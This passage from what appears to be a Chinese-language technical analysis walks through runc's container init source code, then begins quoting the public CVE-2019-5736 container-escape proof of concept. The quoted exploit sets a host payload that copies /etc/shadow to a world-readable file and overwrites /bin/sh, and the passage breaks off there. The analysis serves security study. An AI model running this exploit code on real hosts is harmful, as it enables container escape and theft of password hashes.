</span><span class="lnt">184
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">l</span> <span class="o">*</span><span class="nx">linuxStandardInit</span><span class="p">)</span> <span class="nf">Init</span><span class="p">()</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="nx">runtime</span><span class="p">.</span><span class="nf">LockOSThread</span><span class="p">()</span>
    <span class="k">defer</span> <span class="nx">runtime</span><span class="p">.</span><span class="nf">UnlockOSThread</span><span class="p">()</span>
    <span class="k">if</span> <span class="p">!</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">NoNewKeyring</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">selinux</span><span class="p">.</span><span class="nf">SetKeyLabel</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">ProcessLabel</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">err</span>
        <span class="p">}</span>
        <span class="k">defer</span> <span class="nx">selinux</span><span class="p">.</span><span class="nf">SetKeyLabel</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">)</span>
        <span class="nx">ringname</span><span class="p">,</span> <span class="nx">keepperms</span><span class="p">,</span> <span class="nx">newperms</span> <span class="o">:=</span> <span class="nx">l</span><span class="p">.</span><span class="nf">getSessionRingParams</span><span class="p">()</span>

        <span class="c1">// Do not inherit the parent&#39;s session keyring.
</span><span class="c1"></span>        <span class="k">if</span> <span class="nx">sessKeyId</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">keys</span><span class="p">.</span><span class="nf">JoinSessionKeyring</span><span class="p">(</span><span class="nx">ringname</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="c1">// If keyrings aren&#39;t supported then it is likely we are on an
</span><span class="c1"></span>            <span class="c1">// older kernel (or inside an LXC container). While we could bail,
</span><span class="c1"></span>            <span class="c1">// the security feature we are using here is best-effort (it only
</span><span class="c1"></span>            <span class="c1">// really provides marginal protection since VFS credentials are
</span><span class="c1"></span>            <span class="c1">// the only significant protection of keyrings).
</span><span class="c1"></span>            <span class="c1">//
</span><span class="c1"></span>            <span class="c1">// TODO(cyphar): Log this so people know what&#39;s going on, once we
</span><span class="c1"></span>            <span class="c1">//               have proper logging in &#39;runc init&#39;.
</span><span class="c1"></span>            <span class="k">if</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Cause</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">unix</span><span class="p">.</span><span class="nx">ENOSYS</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;join session keyring&#34;</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// Make session keyring searcheable. If we&#39;ve gotten this far we
</span><span class="c1"></span>            <span class="c1">// bail on any error -- we don&#39;t want to have a keyring with bad
</span><span class="c1"></span>            <span class="c1">// permissions.
</span><span class="c1"></span>            <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">keys</span><span class="p">.</span><span class="nf">ModKeyringPerm</span><span class="p">(</span><span class="nx">sessKeyId</span><span class="p">,</span> <span class="nx">keepperms</span><span class="p">,</span> <span class="nx">newperms</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;mod keyring permissions&#34;</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">setupNetwork</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">setupRoute</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>

    <span class="c1">// initialises the labeling system
</span><span class="c1"></span>    <span class="nx">selinux</span><span class="p">.</span><span class="nf">GetEnabled</span><span class="p">()</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">prepareRootfs</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">pipe</span><span class="p">,</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="c1">// Set up the console. This has to be done *before* we finalize the rootfs,
</span><span class="c1"></span>    <span class="c1">// but *after* we&#39;ve given the user the chance to set up all of the mounts
</span><span class="c1"></span>    <span class="c1">// they wanted.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">CreateConsole</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">setupConsole</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">consoleSocket</span><span class="p">,</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">err</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">system</span><span class="p">.</span><span class="nf">Setctty</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;setctty&#34;</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// Finish the rootfs setup.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">Namespaces</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">configs</span><span class="p">.</span><span class="nx">NEWNS</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">finalizeRootfs</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">err</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="nx">hostname</span> <span class="o">:=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">Hostname</span><span class="p">;</span> <span class="nx">hostname</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Sethostname</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">hostname</span><span class="p">));</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;sethostname&#34;</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">apparmor</span><span class="p">.</span><span class="nf">ApplyProfile</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">AppArmorProfile</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;apply apparmor profile&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">value</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">Sysctl</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">writeSystemProperty</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrapf</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;write sysctl key %s&#34;</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">path</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">ReadonlyPaths</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">readonlyPath</span><span class="p">(</span><span class="nx">path</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrapf</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;readonly path %s&#34;</span><span class="p">,</span> <span class="nx">path</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">path</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">MaskPaths</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">maskPath</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">MountLabel</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrapf</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;mask path %s&#34;</span><span class="p">,</span> <span class="nx">path</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">pdeath</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">system</span><span class="p">.</span><span class="nf">GetParentDeathSignal</span><span class="p">()</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;get pdeath signal&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">NoNewPrivileges</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Prctl</span><span class="p">(</span><span class="nx">unix</span><span class="p">.</span><span class="nx">PR_SET_NO_NEW_PRIVS</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;set nonewprivileges&#34;</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// Tell our parent that we&#39;re ready to Execv. This must be done before the
</span><span class="c1"></span>    <span class="c1">// Seccomp rules have been applied, because we need to be able to read and
</span><span class="c1"></span>    <span class="c1">// write to a socket.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">syncParentReady</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">pipe</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;sync ready&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">selinux</span><span class="p">.</span><span class="nf">SetExecLabel</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">ProcessLabel</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;set process label&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">defer</span> <span class="nx">selinux</span><span class="p">.</span><span class="nf">SetExecLabel</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">)</span>
    <span class="c1">// Without NoNewPrivileges seccomp is a privileged operation, so we need to
</span><span class="c1"></span>    <span class="c1">// do this before dropping capabilities; otherwise do it as late as possible
</span><span class="c1"></span>    <span class="c1">// just before execve so as few syscalls take place after it as possible.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">Seccomp</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="o">&amp;&amp;</span> <span class="p">!</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">NoNewPrivileges</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">seccomp</span><span class="p">.</span><span class="nf">InitSeccomp</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">Seccomp</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">err</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">finalizeNamespace</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="c1">// finalizeNamespace can change user/group which clears the parent death
</span><span class="c1"></span>    <span class="c1">// signal, so we restore it here.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">pdeath</span><span class="p">.</span><span class="nf">Restore</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;restore pdeath signal&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="c1">// Compare the parent from the initial start of the init process and make
</span><span class="c1"></span>    <span class="c1">// sure that it did not change.  if the parent changes that means it died
</span><span class="c1"></span>    <span class="c1">// and we were reparented to something else so we should just kill ourself
</span><span class="c1"></span>    <span class="c1">// and not cause problems for someone else.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Getppid</span><span class="p">()</span> <span class="o">!=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">parentPid</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Kill</span><span class="p">(</span><span class="nx">unix</span><span class="p">.</span><span class="nf">Getpid</span><span class="p">(),</span> <span class="nx">unix</span><span class="p">.</span><span class="nx">SIGKILL</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="c1">// Check for the arg before waiting to make sure it exists and it is
</span><span class="c1"></span>    <span class="c1">// returned as a create time error.
</span><span class="c1"></span>    <span class="nx">name</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">LookPath</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="c1">// Close the pipe to signal that we have completed our init.
</span><span class="c1"></span>    <span class="nx">logrus</span><span class="p">.</span><span class="nf">Debugf</span><span class="p">(</span><span class="s">&#34;init: closing the pipe to signal completion&#34;</span><span class="p">)</span>
    <span class="nx">l</span><span class="p">.</span><span class="nx">pipe</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>

    <span class="c1">// Close the log pipe fd so the parent&#39;s ForwardLogs can exit.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Close</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">logFd</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;closing log pipe fd&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="c1">// Wait for the FIFO to be opened on the other side before exec-ing the
</span><span class="c1"></span>    <span class="c1">// user process. We open it through /proc/self/fd/$fd, because the fd that
</span><span class="c1"></span>    <span class="c1">// was given to us was an O_PATH fd to the fifo itself. Linux allows us to
</span><span class="c1"></span>    <span class="c1">// re-open an O_PATH fd through /proc.
</span><span class="c1"></span>    <span class="nx">fd</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Open</span><span class="p">(</span><span class="s">&#34;/proc/self/fd/&#34;</span><span class="o">+</span><span class="nx">strconv</span><span class="p">.</span><span class="nf">Itoa</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">fifoFd</span><span class="p">),</span> <span class="nx">unix</span><span class="p">.</span><span class="nx">O_WRONLY</span><span class="p">|</span><span class="nx">unix</span><span class="p">.</span><span class="nx">O_CLOEXEC</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;open exec fifo&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="nx">fd</span><span class="p">,</span> <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&#34;0&#34;</span><span class="p">));</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;write 0 exec fifo&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="c1">// Close the O_PATH fifofd fd before exec because the kernel resets
</span><span class="c1"></span>    <span class="c1">// dumpable in the wrong order. This has been fixed in newer kernels, but
</span><span class="c1"></span>    <span class="c1">// we keep this to ensure CVE-2016-9962 doesn&#39;t re-emerge on older kernels.
</span><span class="c1"></span>    <span class="c1">// N.B. the core issue itself (passing dirfds to the host filesystem) has
</span><span class="c1"></span>    <span class="c1">// since been resolved.
</span><span class="c1"></span>    <span class="c1">// https://github.com/torvalds/linux/blob/v4.9/fs/exec.c#L1290-L1318
</span><span class="c1"></span>    <span class="nx">unix</span><span class="p">.</span><span class="nf">Close</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">fifoFd</span><span class="p">)</span>
    <span class="c1">// Set seccomp as close to execve as possible, so as few syscalls take
</span><span class="c1"></span>    <span class="c1">// place afterward (reducing the amount of syscalls that users need to
</span><span class="c1"></span>    <span class="c1">// enable in their seccomp profiles).
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">Seccomp</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="o">&amp;&amp;</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">NoNewPrivileges</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">seccomp</span><span class="p">.</span><span class="nf">InitSeccomp</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">Seccomp</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;init seccomp&#34;</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">s</span> <span class="o">:=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">SpecState</span>
    <span class="nx">s</span><span class="p">.</span><span class="nx">Pid</span> <span class="p">=</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Getpid</span><span class="p">()</span>
    <span class="nx">s</span><span class="p">.</span><span class="nx">Status</span> <span class="p">=</span> <span class="nx">specs</span><span class="p">.</span><span class="nx">StateCreated</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">Hooks</span><span class="p">[</span><span class="nx">configs</span><span class="p">.</span><span class="nx">StartContainer</span><span class="p">].</span><span class="nf">RunHooks</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">unix</span><span class="p">.</span><span class="nf">Exec</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">l</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">0</span><span class="p">:],</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Environ</span><span class="p">());</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;exec user process&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="0x02-调用链梳理">0x02 调用链梳理</h2>
<p><a href="https://www.processon.com/view/link/607ee8e01e08534f373243e6" target="_blank" rel="noopener noreffer">流程图</a></p>
<h2 id="0x03-runc漏洞poc分析">0x03 runc漏洞poc分析</h2>
<p>以<a href="https://github.com/Frichetten/CVE-2019-5736-PoC" target="_blank" rel="noopener noreffer">https://github.com/Frichetten/CVE-2019-5736-PoC</a>为例</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="c1">// Implementation of CVE-2019-5736
</span><span class="c1">// Created with help from @singe, @_cablethief, and @feexd.
</span><span class="c1">// This commit also helped a ton to understand the vuln
</span><span class="c1">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
</span><span class="c1"></span><span class="kn">import</span> <span class="p">(</span>
    <span class="s">&#34;fmt&#34;</span>
    <span class="s">&#34;io/ioutil&#34;</span>
    <span class="s">&#34;os&#34;</span>
    <span class="s">&#34;strconv&#34;</span>
    <span class="s">&#34;strings&#34;</span>
<span class="p">)</span>

<span class="c1">// This is the line of shell commands that will execute on the host
</span><span class="c1"></span><span class="kd">var</span> <span class="nx">payload</span> <span class="p">=</span> <span class="s">&#34;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&#34;</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// First we overwrite /bin/sh with the /proc/self/exe interpreter path
</span><span class="c1"></span>    <span class="nx">fd</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="nx">fmt</span><span class="p">.</span><span class="nf">Fprintln</span><span class="p">(</span><span class="nx">fd</span><span class="p">,</span> <span class="s">&#34;#!/proc/self/exe&#34;</span><span class="p">)</span>
    <span class="nx">err</span> <span class="p">=</span> <span class="nx">fd</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
